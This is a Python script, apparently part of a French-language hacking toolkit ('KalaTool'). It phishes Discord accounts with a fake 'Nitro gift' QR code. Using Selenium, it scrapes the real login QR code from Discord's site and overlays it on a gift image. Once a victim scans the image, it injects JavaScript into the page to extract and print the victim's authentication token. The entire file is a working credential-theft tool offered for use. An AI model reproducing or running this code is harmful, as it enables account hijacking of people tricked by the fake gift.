import os, sys, time, os.path, random, base64, ctypes
from colorama import Fore
from selenium import webdriver
from PIL import Image
from bs4 import BeautifulSoup

def main():
    ctypes.windll.kernel32.SetConsoleTitleW("[KalaTool] - FakeQR Code")
    kalahome()
    print(f"""{Fore.LIGHTRED_EX }[{Fore.LIGHTBLUE_EX }+{Fore.LIGHTRED_EX }]{Fore.LIGHTBLUE_EX } Dysfonctionnement: \n""")
    print(f"""          {Fore.LIGHTRED_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTRED_EX }]{Fore.LIGHTBLUE_EX } Ne fermez pas la fenêtre GoogleChrome ou vous ne pourrez pas vous connecter\n""")
    print(f"""          {Fore.LIGHTRED_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTRED_EX }]{Fore.LIGHTBLUE_EX } Le FakeNitro expire apres 1min20, alors faites vite\n\n\n""")
    input(f"""{Fore.LIGHTRED_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTRED_EX }]{Fore.LIGHTBLUE_EX } appuyez sur ENTER pour continuer""")
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options, executable_path=r'Additional_File/4_TokenFakeQr/chromedriver.exe')
    driver.get('https://discord.com/login')
    time.sleep(5)
    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features='lxml')
    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'Additional_File/4_TokenFakeQr/img/qr_code.png')
    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
    with open(file,'wb') as handler:
            handler.write(img_data)
    discord_login = driver.current_url
    bg = Image.open('Additional_File/4_TokenFakeQr/img/back.png')
    qrcode = Image.open('Additional_File/4_TokenFakeQr/img/qr_code.png')
    qrcode = qrcode.resize(size=(127, 127))
    bg.paste(qrcode, (87, 313))
    discord = Image.open('Additional_File/4_TokenFakeQr/img/discord.png')
    discord = discord.resize(size=(40, 40))
    bg.paste(discord, (130, 355), discord)
    bg.save('temp/NitroGift.png')
    print(f"""\n{Fore.LIGHTRED_EX }[{Fore.LIGHTGREEN_EX }+{Fore.LIGHTRED_EX }]{Fore.LIGHTBLUE_EX } Le code QR a ete genere - [Image: "temp/NitroGift.png"] \n""")
    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script('''
    var req = webpackJsonp.push([
        [], {
            extra_id: (e, t, r) => e.exports = r
        },
        [
            ["extra_id"]
        ]
    ]);
    for (let e in req.c)
        if (req.c.hasOwnProperty(e)) {
            let t = req.c[e].exports;
            if (t && t.__esModule && t.default)
                for (let e in t.default) "getToken" === e && (token = t.default.getToken())
        }
    return token;   
                ''')
            print(f"""{Fore.LIGHTRED_EX }[{Fore.LIGHTBLUE_EX }+{Fore.LIGHTRED_EX }]{Fore.LIGHTBLUE_EX } Un token a été trouvé: {token}""")
            break
    print(f"""\n\n{Fore.LIGHTRED_EX }[{Fore.LIGHTGREEN_EX }!{Fore.LIGHTRED_EX }]{Fore.LIGHTBLUE_EX } Le FakeNitro a ete scanner - Token saisi avec succès""")
    input(f"""{Fore.LIGHTRED_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTRED_EX }]{Fore.LIGHTBLUE_EX } Appuyez sur ENTER pour quitter""")
    exit(0)

main()